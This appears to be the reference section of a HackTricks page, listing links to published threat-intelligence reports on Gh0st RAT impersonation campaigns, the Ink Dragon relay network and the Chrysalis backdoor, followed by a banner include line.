- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
